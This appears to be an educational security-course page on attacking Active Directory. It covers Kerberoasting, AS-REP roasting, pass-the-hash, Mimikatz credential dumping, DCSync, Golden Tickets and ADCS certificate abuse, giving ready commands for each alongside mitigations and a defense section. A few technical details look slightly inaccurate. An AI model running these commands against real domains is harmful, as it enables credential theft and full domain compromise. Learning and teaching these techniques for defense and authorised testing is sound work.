@@ -1,0 +1,546 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>Active Directory hacking — Cybersec Zero to Hero</title>
+<link rel="stylesheet" href="../../styles.css">
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="brand">
+      <div class="brand-mark">&gt;_</div>
+      <div>
+        <div class="brand-title">CYBERSEC</div>
+        <div class="brand-subtitle">zero · to · hero</div>
+      </div>
+    </div>
+    <div class="lang-switch"><a href="../../pages/13-active-directory.html" class="lang-link" title="Passa all'italiano"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="10" height="20" fill="#009246"/><rect x="10" width="10" height="20" fill="#fff"/><rect x="20" width="10" height="20" fill="#ce2b37"/></svg> IT</a><span class="lang-active" title="English"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="30" height="20" fill="#012169"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#fff" stroke-width="3"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#c8102e" stroke-width="1.5"/><path d="M15,0 v20 M0,10 h30" stroke="#fff" stroke-width="5"/><path d="M15,0 v20 M0,10 h30" stroke="#c8102e" stroke-width="3"/></svg> EN</span></div>
+  </div>
+  <div class="search-wrap">
+    <div class="search-row">
+      <div class="search-inputwrap">
+        <span class="search-icon" aria-hidden="true">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="20" y1="20" x2="16.65" y2="16.65"/>
+          </svg>
+        </span>
+        <input class="search-input" id="search-input" type="text" placeholder="search... (press /)" autocomplete="off" aria-label="Search">
+        <button class="search-clear" id="search-clear" type="button" aria-label="Clear" title="Clear">&times;</button>
+      </div>
+      <button class="search-btn" id="search-btn" type="button" aria-label="SEARCH" title="SEARCH">SEARCH</button>
+    </div>
+    <div class="search-hits" id="search-hits" role="listbox"></div>
+  </div>
+  <div class="sidebar-nav">
+    <nav class="nav-section">
+      <div class="nav-section-title">Path</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="../index.html"><span class="num">00</span>Home</a></li>
+        <li class="nav-item"><a href="../pages/00-path-and-mindset.html" class=""><span class="num">00</span>Path, mindset, ethics and law</a></li><li class="nav-item"><a href="../pages/00b-math-and-cs.html" class=""><span class="num">00b</span>Math and computation theory (the bare minimum, integrated)</a></li><li class="nav-item"><a href="../pages/01-cs-fundamentals.html" class=""><span class="num">01</span>Computer science fundamentals for security</a></li><li class="nav-item"><a href="../pages/01b-assembly-from-zero.html" class=""><span class="num">01b</span>x86-64 and ARM64 Assembly from zero</a></li><li class="nav-item"><a href="../pages/02-essential-linux.html" class=""><span class="num">02</span>Essential Linux for security</a></li><li class="nav-item"><a href="../pages/02b-regex-automata.html" class=""><span class="num">02b</span>Regex, automata, and parsers for security</a></li><li class="nav-item"><a href="../pages/03-networking-tcp-ip.html" class=""><span class="num">03</span>Networking: from cables to TCP/IP</a></li><li class="nav-item"><a href="../pages/04-http-tls.html" class=""><span class="num">04</span>HTTP, HTTPS and TLS in depth</a></li><li class="nav-item"><a href="../pages/05-cryptography.html" class=""><span class="num">05</span>Cryptography: theory and practice</a></li><li class="nav-item"><a href="../pages/05b-crypto-worked-examples.html" class=""><span class="num">05b</span>Cryptography — step-by-step worked examples</a></li><li class="nav-item"><a href="../pages/06-os-internals.html" class=""><span class="num">06</span>OS internals: Linux and Windows in depth</a></li><li class="nav-item"><a href="../pages/07-programming-for-security.html" class=""><span class="num">07</span>Programming for security: Python, C, Go</a></li><li class="nav-item"><a href="../pages/08-osint-recon.html" class=""><span class="num">08</span>OSINT and reconnaissance</a></li><li class="nav-item"><a href="../pages/09-scanning-enumeration.html" class=""><span class="num">09</span>Scanning, enumeration and fingerprinting</a></li><li class="nav-item"><a href="../pages/10-owasp-top10.html" class=""><span class="num">10</span>OWASP Top 10 and beyond — basic web vulnerabilities</a></li><li class="nav-item"><a href="../pages/10b-walkthrough-byte-by-byte.html" class=""><span class="num">10b</span>Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR</a></li><li class="nav-item"><a href="../pages/11-advanced-web.html" class=""><span class="num">11</span>Advanced web hacking</a></li><li class="nav-item"><a href="../pages/12-network-attacks.html" class=""><span class="num">12</span>Network attacks: MITM, spoofing, pivoting</a></li><li class="nav-item"><a href="../pages/13-active-directory.html" class="active"><span class="num">13</span>Active Directory hacking</a></li><li class="nav-item"><a href="../pages/14-exploit-development.html" class=""><span class="num">14</span>Exploit development: from buffer overflow to ROP</a></li><li class="nav-item"><a href="../pages/14b-bof-to-shell-complete.html" class=""><span class="num">14b</span>BoF → shell: a complete exploit from zero</a></li><li class="nav-item"><a href="../pages/15-reverse-engineering.html" class=""><span class="num">15</span>Reverse engineering</a></li><li class="nav-item"><a href="../pages/16-malware-analysis.html" class=""><span class="num">16</span>Malware: taxonomy and analysis</a></li><li class="nav-item"><a href="../pages/17-mobile-security.html" class=""><span class="num">17</span>Mobile security: Android and iOS</a></li><li class="nav-item"><a href="../pages/18-cloud-security.html" class=""><span class="num">18</span>Cloud security: AWS, Azure, GCP</a></li><li class="nav-item"><a href="../pages/19-container-kubernetes.html" class=""><span class="num">19</span>Containers and Kubernetes</a></li><li class="nav-item"><a href="../pages/20-wireless-radio.html" class=""><span class="num">20</span>Wireless and radio: WiFi, BT, SDR</a></li><li class="nav-item"><a href="../pages/21-hardware-firmware.html" class=""><span class="num">21</span>Hardware and firmware hacking</a></li><li class="nav-item"><a href="../pages/22-forensics-dfir.html" class=""><span class="num">22</span>Forensics and DFIR</a></li><li class="nav-item"><a href="../pages/23-blue-team-soc.html" class=""><span class="num">23</span>Blue team: SOC, SIEM, EDR, hunting</a></li><li class="nav-item"><a href="../pages/24-threat-intelligence.html" class=""><span class="num">24</span>Threat intelligence</a></li><li class="nav-item"><a href="../pages/25-grc-regulations.html" class=""><span class="num">25</span>GRC, regulations, and standards</a></li><li class="nav-item"><a href="../pages/26-red-team.html" class=""><span class="num">26</span>Red team and adversary emulation</a></li><li class="nav-item"><a href="../pages/27-ai-ml-security.html" class=""><span class="num">27</span>AI / ML security</a></li><li class="nav-item"><a href="../pages/28-capstone-roadmap.html" class=""><span class="num">28</span>Capstone: CTF roadmap, home lab, certifications</a></li><li class="nav-item"><a href="../pages/29-master-cheatsheet.html" class=""><span class="num">29</span>Master cheatsheet</a></li><li class="nav-item"><a href="../pages/30-extended-glossary.html" class=""><span class="num">30</span>Extended glossary (250+ terms)</a></li><li class="nav-item"><a href="../pages/31-it-eu-regulations.html" class=""><span class="num">31</span>IT/EU regulatory references in detail</a></li>
+      </ul>
+    </nav>
+  </div>
+</aside>
+  <main class="main">
+    <div class="content">
+      <div class="page-meta">
+        <span class="pill">Network</span>
+        <span>Section 17 of 36</span>
+        <span class="level-tag level-adv">Level: advanced</span>
+      </div>
+      <h1>Active Directory hacking</h1>
+      <p class="summary">Kerberos, NTLM, GPP, ASREP roasting, Kerberoasting, AS-REP roast, DCSync, Golden/Silver/Diamond/Sapphire ticket, BloodHound, ADCS attacks (ESC1-ESC15), trust abuse. The heart of every enterprise pentest.</p>
+      <div class="info-card">
+  <div class="label">Area</div>
+  <div>Network</div>
+  <div class="label">Prerequisites</div>
+  <ul class="source-list"><li>Section 06 (Windows internals), 12 (network attacks)</li></ul>
+  <div class="label">Tools</div>
+  <ul class="source-list"><li>BloodHound + SharpHound/AzureHound/RustHound</li><li>impacket (GetUserSPNs, GetNPUsers, secretsdump, psexec, wmiexec, getST)</li><li>Rubeus, Mimikatz, Certify, Certipy</li><li>CrackMapExec / NetExec</li><li>kerbrute</li></ul>
+</div>
+      <blockquote>
+<p>Active Directory is the identity backbone of ~90% of the world's companies. Knowing it inside out is the difference between junior and senior pentesters. A long section, but a necessary one.</p>
+</blockquote>
+<h2 id="ad-in-10-seconds">AD in 10 seconds</h2>
+<p><strong>Active Directory Domain Services (AD DS)</strong> is Microsoft's centralized directory that manages:
+- Users and groups.
+- Computers.
+- Security policies (GPO).
+- Internal corporate DNS.
+- Authentication (Kerberos primary, NTLM legacy).</p>
+<p><strong>Structure:</strong>
+- <strong>Forest</strong> — trust boundary (multiple domains).
+- <strong>Domain</strong> — namespace (<code>example.local</code>).
+- <strong>OU</strong> — organizational unit (logical folder).
+- <strong>Sites</strong> — physical topology (subnet ↔ DC mapping for replication/logon).
+- <strong>Trust</strong> — relationships between domains/forests.</p>
+<p><strong>Key components:</strong>
+- <strong>DC</strong> (Domain Controller) — host with AD DS.
+- <strong>GC</strong> (Global Catalog) — cross-domain index.
+- <strong>KDC</strong> (Key Distribution Center) — runs Kerberos, it is the DC itself.
+- <strong>DNS</strong> — usually on the DC.
+- <strong>SYSVOL</strong> — replicated share that contains GPOs.</p>
+<h2 id="kerberos-step-by-step-the-long-version">Kerberos step-by-step (the long version)</h2>
+<blockquote>
+<p>Kerberos is "compressed" in many tutorials. Here I break it down because all AD attacks are built on understanding it.</p>
+</blockquote>
+<h3 id="the-basic-idea">The basic idea</h3>
+<p>Three actors:
+- <strong>KDC</strong> (Key Distribution Center): a single process on the DC that plays two logical roles: AS (authenticates) and TGS (issues tickets for services).
+- <strong>Client</strong>: the user (or computer) that wants to access something.
+- <strong>Service</strong>: SMB on a file server, LDAP on the DC, HTTP on an app, MSSQL on a DB.</p>
+<p>The principle: <strong>never send the password to the service</strong>. Encrypted <strong>tickets</strong> are exchanged that the service can verify because it shares a secret key with the KDC.</p>
+<p>All keys are <strong>derived from passwords</strong> via KDF (RC4-HMAC = NT hash, or AES128/AES256 + salt = string2key).</p>
+<h3 id="the-keys-in-play-the-thing-that-confuses-everyone">The keys in play (the thing that confuses everyone)</h3>
+<p>Three types of symmetric keys:</p>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>Derived from</th>
+<th>Who knows it</th>
+<th>What it's for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>User key</strong> $K_U$</td>
+<td>alice's password</td>
+<td>alice + KDC</td>
+<td>encrypt the AS-REP for alice</td>
+</tr>
+<tr>
+<td><strong>krbtgt key</strong> $K_{krbtgt}$</td>
+<td><code>krbtgt</code> account password</td>
+<td>only KDC</td>
+<td>encrypt the TGT (for the KDC itself)</td>
+</tr>
+<tr>
+<td><strong>Service key</strong> $K_S$</td>
+<td>service account password (or computer$)</td>
+<td>service + KDC</td>
+<td>encrypt the service ticket</td>
+</tr>
+</tbody>
+</table>
+<p>To these are added the <strong>session keys</strong>: random symmetric keys generated by the KDC for each session, inside encrypted tickets.</p>
+<h3 id="phase-1-as-req-as-rep-the-user-proves-who-they-are">Phase 1 — AS-REQ / AS-REP (the user proves who they are)</h3>
+<div class="mermaid">
+sequenceDiagram
+    autonumber
+    participant U as Client (alice)
+    participant KDC as KDC (Auth Server)
+    Note over U: types password → derive K_U
+    U->>KDC: AS-REQ<br/>{ cname:"alice", realm:"EXAMPLE.LOCAL",<br/>  PA-ENC-TIMESTAMP = E(K_U, timestamp) }
+    Note over KDC: KDC has K_U (lookup AD).<br/>Decrypts the timestamp.<br/>If valid (within 5 min) → ok.
+    KDC->>U: AS-REP<br/>{ E(K_U, session_key_TGS),<br/>  TGT = E(K_krbtgt, {alice, session_key_TGS,<br/>      groups, valid_until, ...}) }
+    Note over U: Decrypts session_key_TGS with K_U.<br/>Saves TGT in the krb5 cache.
+
+</div>
+
+<p><strong>What the TGT contains</strong> (when the KDC encrypts it, no one reads it outside the KDC):
+- client identity (<code>alice@EXAMPLE.LOCAL</code>)
+- TGS <strong>session key</strong> (random, valid for the session)
+- group memberships (encoded in the <strong>PAC</strong> — Privilege Attribute Certificate)
+- validity (typically 10 hours)
+- flags (forwardable, renewable, ...)</p>
+<p><strong>Pre-Authentication</strong> (the <code>PA-ENC-TIMESTAMP</code>): if missing, the KDC would give an AS-REP to anyone asking "pretend to be alice" → the attacker would receive material encrypted with $K_U$ and could brute-force offline. <strong>This is exactly AS-REP Roasting</strong> — it only works if preauth is disabled on the account.</p>
+<h3 id="phase-2-tgs-req-tgs-rep-i-ask-for-a-ticket-to-a-specific-service">Phase 2 — TGS-REQ / TGS-REP (I ask for a ticket to a specific service)</h3>
+<div class="mermaid">
+sequenceDiagram
+    autonumber
+    participant U as Client (alice)
+    participant KDC as KDC (Ticket Granting Server)
+    Note over U: wants to access \\fileserver01<br/>SPN = cifs/fileserver01.example.local
+    U->>KDC: TGS-REQ<br/>{ TGT (unchanged),<br/>  authenticator = E(session_key_TGS, {alice, timestamp}),<br/>  requested SPN }
+    Note over KDC: Decrypts TGT with K_krbtgt.<br/>Extracts session_key_TGS.<br/>Decrypts authenticator.<br/>Verifies timestamp (anti-replay).
+    KDC->>U: TGS-REP<br/>{ E(session_key_TGS, session_key_service),<br/>  service_ticket = E(K_S, {alice, session_key_service,<br/>      PAC, valid_until}) }
+    Note over U: Decrypts session_key_service.<br/>Stores service_ticket.
+
+</div>
+
+<p>Key points:
+- The KDC does <strong>not</strong> ask alice for her password again. It trusts the TGT it encrypted itself.
+- The service ticket is encrypted with $K_S$ = the <strong>target service's</strong> key (e.g. the mssql_svc service account, or the FILESERVER01$ computer account).
+- <strong>Kerberoasting</strong>: anyone with a TGT can request a TGS for any SPN. They receive a blob encrypted with $K_S$. If the service account's password is weak, brute-force offline.</p>
+<h3 id="phase-3-ap-req-ap-rep-i-present-the-ticket-to-the-service">Phase 3 — AP-REQ / AP-REP (I present the ticket to the service)</h3>
+<div class="mermaid">
+sequenceDiagram
+    autonumber
+    participant U as Client (alice)
+    participant SVC as Service (fileserver01, SMB)
+    U->>SVC: AP-REQ<br/>{ service_ticket,<br/>  authenticator = E(session_key_service, {alice, timestamp}) }
+    Note over SVC: Decrypts service_ticket with K_S (it knows it!).<br/>Extracts session_key_service.<br/>Decrypts authenticator → verifies.
+    SVC->>U: AP-REP (optional, mutual auth)<br/>{ E(session_key_service, timestamp+1) }
+    Note over U,SVC: Authenticated SMB session.<br/>Encryption/signing at the application layer
+
+</div>
+
+<p>The service <strong>never talks to the KDC</strong> during this step: it has everything it needs to validate the ticket thanks to pre-shared $K_S$.</p>
+<h3 id="what-the-pac-is-and-why-it-matters">What the PAC is and why it matters</h3>
+<p>The <strong>PAC</strong> (Privilege Attribute Certificate) is a structure <strong>inside</strong> the ticket that contains:
+- User SID.
+- Group SIDs (Domain Admins, Domain Users, ...).
+- Logon time.
+- Server signature + KDC signature (for integrity).</p>
+<p>When it arrives at the service, the PAC says "here are alice's roles". The service decides authorization (e.g. SMB on shares based on groups).</p>
+<p><strong>Golden Ticket</strong> = forge a TGT with the krbtgt hash + a controlled PAC (put yourself in Domain Admins). It will always print Authorized because the PAC is inside the encrypted ticket and nobody calls back to the KDC to validate.</p>
+<h3 id="numerical-example-of-a-kerberoast-crack">Numerical example of a Kerberoast crack</h3>
+<p>You capture a TGS-REP with <code>GetUserSPNs.py</code>. You extract:</p>
+<pre><code>$krb5tgs$23$*mssql_svc$EXAMPLE.LOCAL$cifs/sql01.example.local*$&lt;RC4 ciphertext&gt;
+</code></pre>
+<p><code>23</code> = RC4-HMAC encryption type (NT hash as key). Crack:</p>
+<pre><code class="language-bash">hashcat -m 13100 ticket.txt rockyou.txt
+</code></pre>
+<p>For each candidate <code>pw</code>:
+- Compute $K = \text{MD4}(\text{UTF-16LE}(pw))$ (NT hash).
+- Decrypt the RC4 ciphertext.
+- If the plaintext begins with a valid ASN.1 schema (Kerberos struct), match.</p>
+<p>Speed: ~10 GH/s on an RTX 4090. 8-char mixed password = hours or days; strong passphrases = centuries.</p>
+<blockquote>
+<p><strong>Lesson</strong>: use <code>--enctype aes256</code> (default today) for service tickets = $K = \text{PBKDF2}(pw)$ much slower to crack. And even better, <strong>gMSA</strong> (240-byte random password managed by Microsoft).</p>
+</blockquote>
+<h3 id="visual-summary-of-the-3-hops">Visual summary of the 3 hops</h3>
+<div class="mermaid">
+sequenceDiagram
+    autonumber
+    participant U as Client (alice)
+    participant AS as Auth Server (KDC)
+    participant TGS as Ticket Granting Server (KDC)
+    participant SVC as Service (e.g. SMB on file server)
+    U->>AS: AS-REQ (request TGT, identity=alice)
+    AS->>U: AS-REP (TGT encrypted with krbtgt key)
+    U->>TGS: TGS-REQ (TGT + service SPN)
+    TGS->>U: TGS-REP (service ticket encrypted with service key)
+    U->>SVC: AP-REQ (present service ticket)
+    SVC->>U: AP-REP (authenticated session)
+    Note over U,SVC: From here the user accesses the service
+
+</div>
+
+<h3 id="where-to-attack-summary">"Where to attack" summary</h3>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Capturable material</th>
+<th>Attack name</th>
+<th>Required prerequisite</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AS-REP without preauth</td>
+<td>E(K_U, ...)</td>
+<td><strong>AS-REP Roasting</strong></td>
+<td>user with <code>DONT_REQ_PREAUTH</code></td>
+</tr>
+<tr>
+<td>TGS-REP for any SPN</td>
+<td>E(K_S, ...)</td>
+<td><strong>Kerberoasting</strong></td>
+<td>any domain user</td>
+</tr>
+<tr>
+<td>krbtgt hash compromised</td>
+<td>—</td>
+<td><strong>Golden Ticket</strong></td>
+<td>DCSync or full compromise</td>
+</tr>
+<tr>
+<td>service account hash</td>
+<td>—</td>
+<td><strong>Silver Ticket</strong></td>
+<td>compromised service account</td>
+</tr>
+<tr>
+<td>TGT in memory of a server with unconstrained delegation</td>
+<td>victim TGTs</td>
+<td><strong>Unconstrained delegation abuse</strong></td>
+<td>control of the server</td>
+</tr>
+<tr>
+<td>ACL on computer object</td>
+<td>write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></td>
+<td><strong>RBCD</strong></td>
+<td>WriteDACL/GenericWrite</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Identify a "service" account by its SPN (Service Principal Name).</strong></p>
+<h2 id="ntlm-legacy-but-alive">NTLM (legacy but alive)</h2>
+<p>Challenge-response based on a hash:
+- Client sends <code>NEGOTIATE</code>.
+- Server <code>CHALLENGE</code> with a random.
+- Client replies with <code>NTLM(hash, challenge)</code>.
+- Server verifies.</p>
+<p><strong>NTLM hash:</strong> MD4 of the Unicode password. <strong>Fast to crack</strong> (sub-second if weak).</p>
+<p>Cracking via Responder, see section 12.</p>
+<h2 id="ad-recon-post-foothold">AD recon (post-foothold)</h2>
+<p>Once you are inside a host with a domain user (any):</p>
+<h3 id="without-offensive-tools-lotl">Without offensive tools (LotL)</h3>
+<pre><code class="language-powershell"># Domain info
+Get-ADDomain                         # ActiveDirectory module if installed
+nltest /domain_trusts
+nltest /dclist:example.local
+
+whoami /groups
+whoami /priv
+
+net user /domain
+net group &quot;Domain Admins&quot; /domain
+net group &quot;Enterprise Admins&quot; /domain
+
+# Sessions
+qwinsta /server:dc01
+quser /server:fileserver
+
+# All computers
+Get-ADComputer -Filter * | Select Name
+</code></pre>
+<h3 id="with-offensive-tools">With offensive tools</h3>
+<p><strong>BloodHound</strong> is the gold standard:
+1. Collector (<strong>SharpHound</strong> in C#, <strong>BloodHound.py</strong> in Python, <strong>RustHound</strong>).
+2. Import JSON into BloodHound (Neo4j backend).
+3. Run pre-built Cypher queries ("Find Shortest Path to Domain Admin", "Kerberoastable users", ...).</p>
+<pre><code class="language-bash"># SharpHound.exe (on the target)
+SharpHound.exe -c All --zipfilename loot.zip
+
+# BloodHound.py (from Linux with creds)
+bloodhound-python -d example.local -u alice -p Password1 -c all -ns 10.10.10.1
+</code></pre>
+<p><strong>enum4linux-ng</strong>, <strong>CrackMapExec/NetExec</strong>, <strong>PowerView</strong> (PowerShell).</p>
+<pre><code class="language-bash">nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
+nxc ldap dc01 -u alice -p Password1 --users
+nxc ldap dc01 -u alice -p Password1 --asreproast asrep.txt
+nxc ldap dc01 -u alice -p Password1 --kerberoast spn.txt
+</code></pre>
+<h2 id="the-classic-attacks">The classic attacks</h2>
+<h3 id="1-as-rep-roasting">1. AS-REP Roasting</h3>
+<p>If an account has <strong>"Do not require Kerberos preauthentication"</strong> (UAC <code>DONT_REQ_PREAUTH</code>), anyone can request its AS-REP — which contains material encrypted with the password hash. You feed it to hashcat.</p>
+<pre><code class="language-bash">GetNPUsers.py -dc-ip 10.10.10.1 example.local/ -usersfile users.txt -no-pass
+hashcat -m 18200 hashes.txt rockyou.txt
+</code></pre>
+<p>Mitigation: remove the flag (user configuration).</p>
+<h3 id="2-kerberoasting">2. Kerberoasting</h3>
+<p>Every domain user can request a <strong>service ticket</strong> for any SPN. The service ticket is encrypted with the <strong>service account's</strong> password hash. If the account is a user with a weak password → offline crack.</p>
+<pre><code class="language-bash">GetUserSPNs.py example.local/alice:Password1 -dc-ip 10.10.10.1 -request -outputfile spns.txt
+hashcat -m 13100 spns.txt rockyou.txt
+</code></pre>
+<p>Mitigation:
+- Service accounts must be <strong>gMSA</strong> (Group Managed Service Account, Microsoft generates/rotates the password).
+- Long passwords (25+ random).
+- AES instead of RC4 (mode <code>--enctype aes</code> if possible).</p>
+<h3 id="3-pass-the-hash-pth">3. Pass-the-Hash (PTH)</h3>
+<p>In NTLM, <strong>if you have the password hash, you don't need the password</strong>. You use it directly.</p>
+<pre><code class="language-bash">nxc smb 10.10.10.5 -u alice -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+psexec.py -hashes :NTHASH alice@10.10.10.5
+</code></pre>
+<p>Mitigation: Credential Guard (isolated LSASS), restrict NTLM in policy.</p>
+<h3 id="4-pass-the-ticket-overpass-the-hash">4. Pass-the-Ticket / Overpass-the-Hash</h3>
+<p>Same idea but with Kerberos tickets. <strong>Overpass-the-Hash</strong>: given an NT hash, request a TGT (RC4-HMAC) for that user.</p>
+<pre><code class="language-bash"># Rubeus on Windows
+Rubeus.exe asktgt /user:alice /domain:example.local /rc4:HASH /ptt
+# then
+klist  # see the ticket
+# Commands that use Kerberos now work as alice
+</code></pre>
+<h3 id="5-mimikatz-and-lsass">5. Mimikatz and LSASS</h3>
+<p>On the compromised target with local admin:</p>
+<pre><code class="language-text">privilege::debug
+sekurlsa::logonpasswords          # dump all hashes + plaintext (old WDigest)
+sekurlsa::tickets /export          # export tickets
+lsadump::dcsync /user:DC$         # if you have privileges
+</code></pre>
+<p>Defenses: Credential Guard, Defender ASR ("Block credential stealing from LSASS"), EDR. Microsoft has deprecated WDigest (no more plaintext in memory by default), but RC4 and NT hashes are still there.</p>
+<h3 id="6-dcsync">6. DCSync</h3>
+<p>An account with <strong>DS-Replication-Get-Changes-All</strong> privilege on the Domain Naming Context can request replication → receives the hashes of all users, including krbtgt.</p>
+<pre><code class="language-bash">secretsdump.py example.local/admin:Password1@dc01 -just-dc-ntlm
+# From Windows with Rubeus/Mimikatz:
+lsadump::dcsync /user:krbtgt
+</code></pre>
+<p>Typically: Domain Admins, Enterprise Admins, BUILTIN\Administrators of the domain. <strong>Sometimes</strong> also accounts with misconfigured permissions (look for <code>DCSync</code> in BloodHound).</p>
+<h3 id="7-golden-ticket">7. Golden Ticket</h3>
+<p>With the krbtgt hash you <strong>forge an arbitrary TGT</strong>, valid for anyone, usually for 10 years. Long-term persistence.</p>
+<pre><code class="language-text">mimikatz # kerberos::golden /domain:example.local /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /id:500 /ptt
+</code></pre>
+<p>Defense: rotate the krbtgt password twice (Microsoft <code>Reset-KrbtgtKeyInteractive.ps1</code> script).</p>
+<h3 id="8-silver-ticket">8. Silver Ticket</h3>
+<p>With the hash of a <strong>service account</strong>, you forge a valid service ticket for that service. More stealthy than the golden (doesn't go through the DC).</p>
+<h3 id="9-diamond-sapphire-ticket">9. Diamond / Sapphire Ticket</h3>
+<p>Modern techniques that modify a genuine ticket before distribution (Diamond) or request it directly from the KDC with anomalies (Sapphire), to evade detection.</p>
+<h3 id="10-unconstrained-delegation-abuse">10. Unconstrained Delegation Abuse</h3>
+<p>If a host has "Trust this computer for delegation to any service" → when a user authenticates to that host, their TGT is stored there. By compromising the server, you harvest TGTs of admins who connect.</p>
+<p><strong>Printer Bug (CVE-2019-1040, Hot Potato, etc.)</strong>: force the DC to do SMB authentication to your host with unconstrained → receive the DC's TGT → everything compromised.</p>
+<h3 id="11-constrained-delegation-abuse">11. Constrained Delegation Abuse</h3>
+<p>"Account A can impersonate B to service X". If you control A and B is admin of another server → you impersonate B to X.</p>
+<p><strong>S4U2Self/S4U2Proxy</strong> abuse.</p>
+<h3 id="12-resource-based-constrained-delegation-rbcd">12. Resource-Based Constrained Delegation (RBCD)</h3>
+<p>Update the target computer object's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> → you control which account can impersonate to that computer. Combined with other primitives → remote SYSTEM.</p>
+<h3 id="13-gpp-passwords">13. GPP Passwords</h3>
+<p>Historic Group Policy Preferences (pre-2014 MS14-025 patch) stored passwords encrypted with a <strong>publicly known</strong> AES key. You search for <code>cpassword=</code> in SYSVOL <code>\\domain.local\sysvol\domain\Policies\...\Groups.xml</code>. Decrypt with <code>gpp-decrypt</code>. <strong>You still find it in legacy.</strong></p>
+<h3 id="14-adcs-esc1esc15">14. ADCS — ESC1...ESC15</h3>
+<p>Active Directory Certificate Services (enterprise CA). Misconfigured certificate template = <strong>right to issue certificates for other users</strong> = permanent persistence.</p>
+<p>Examples:
+- <strong>ESC1</strong>: Template with <code>EnrolleeSuppliesSubject</code> + <code>CT_FLAG_NO_SECURITY_EXTENSION</code> + Client Authentication EKU + enrollable by a low user. → request cert for "Administrator" → log in as admin.
+- <strong>ESC4</strong>: Template ACL → you modify it → becomes ESC1.
+- <strong>ESC8</strong>: Web Enrollment via NTLM relay → relay → cert for DC$ → DCSync.
+- <strong>ESC9, ESC10, ESC11</strong>: variants of <code>no security extension</code> + weak <code>StrongCertificateBindingEnforcement</code>.</p>
+<p>Tools: <strong>Certipy</strong> (Python), <strong>Certify</strong> (C#).</p>
+<pre><code class="language-bash">certipy find -u alice@example.local -p Password1 -dc-ip 10.10.10.1 -vulnerable -stdout
+certipy req -u alice -p Password1 -ca CA-NAME -template &quot;Vuln-Template&quot; -upn admin@example.local -dc-ip 10.10.10.1
+certipy auth -pfx admin.pfx
+</code></pre>
+<p><strong>Main reference</strong>: paper "Certified Pre-Owned" (SpecterOps, 2021).</p>
+<h3 id="15-acl-abuse">15. ACL abuse</h3>
+<p>Right ACE on the Domain object (e.g. <code>GenericAll</code> on the DC) → DCSync. ACE on a target user → reset password / WriteSPN / WriteOwner → owner chain to admin.</p>
+<p>BloodHound shows everything. Cypher:</p>
+<pre><code class="language-cypher">MATCH p=(s:User)-[r:GenericAll|WriteDacl|WriteOwner|ForceChangePassword]-&gt;(t)
+WHERE s.name STARTS WITH 'ALICE' RETURN p
+</code></pre>
+<h3 id="16-domain-trust-abuse">16. Domain trust abuse</h3>
+<p>In forests/domains with trusts:
+- <strong>SID History injection</strong> if the forest trust has no SID filtering (rare).
+- <strong>Trust ticket forgery</strong> (cross-domain golden ticket).
+- <strong>Cross-forest Kerberos delegation</strong>.</p>
+<h2 id="map-of-a-typical-ad-attack-red-team">Map of a typical AD attack (red team)</h2>
+<ol>
+<li>Initial access (macro phishing / exposed vuln).</li>
+<li>Local privesc to SYSTEM (section 06).</li>
+<li>Credentials on the host (Mimikatz / DPAPI / Browser).</li>
+<li>AD recon (BloodHound).</li>
+<li>Identify a path to domain admin.</li>
+<li>AS-REP roast / Kerberoast → offline crack.</li>
+<li>Lateral movement via PSExec / WMI / WinRM with captured hashes/creds.</li>
+<li>Possibly ADCS abuse / unconstrained / RBCD.</li>
+<li><strong>DCSync</strong> from the target with privileges.</li>
+<li><strong>Golden Ticket</strong> for persistence.</li>
+<li>Data exfil.</li>
+</ol>
+<h2 id="ad-defense-the-key-points">AD defense — the key points</h2>
+<ul>
+<li><strong>Tier model</strong> (Tier 0/1/2): domain admins never logged onto workstations; their accounts separated.</li>
+<li><strong>PAW</strong> (Privileged Access Workstations): dedicated machines for admins with a strict baseline.</li>
+<li><strong>JEA / JIT</strong> (Just Enough/Just In Time Admin): with Microsoft PAM or Identity Governance.</li>
+<li><strong>LAPS</strong> (Local Administrator Password Solution): rotate unique local admin passwords per host, stored in AD.</li>
+<li><strong>Restrict NTLM</strong>, <strong>disable LLMNR/NBT-NS</strong>, <strong>SMB signing required</strong>.</li>
+<li><strong>AD Tier-0 hardening</strong>: no service accounts in Domain Admins.</li>
+<li><strong>MDI</strong> (Microsoft Defender for Identity, formerly Azure ATP): detects enumeration, Kerberos attacks, lateral movement.</li>
+<li><strong>gMSA</strong> for service accounts.</li>
+<li><strong>MFA</strong> + Conditional Access for privileged users.</li>
+<li><strong>Patch Print Spooler</strong> (PrintNightmare etc.); often disable Print Spooler on DCs.</li>
+<li><strong>Rotate krbtgt</strong> regularly.</li>
+<li><strong>ADCS</strong> hardening: review templates, disable Web Enrollment if not needed, EPA + LDAP signing.</li>
+</ul>
+<h2 id="azure-ad-entra-id-overview">Azure AD / Entra ID (overview)</h2>
+<p>Cloud AD has different models:
+- JWT tokens.
+- Conditional Access policies.
+- Attacks: <strong>Pass-the-PRT</strong> (Primary Refresh Token), <strong>Token Theft</strong>, <strong>OAuth phishing</strong> (illicit consent), <strong>Device Code Phishing</strong>.
+- Tools: <strong>ROADtools</strong>, <strong>AADInternals</strong>, <strong>GraphRunner</strong>.</p>
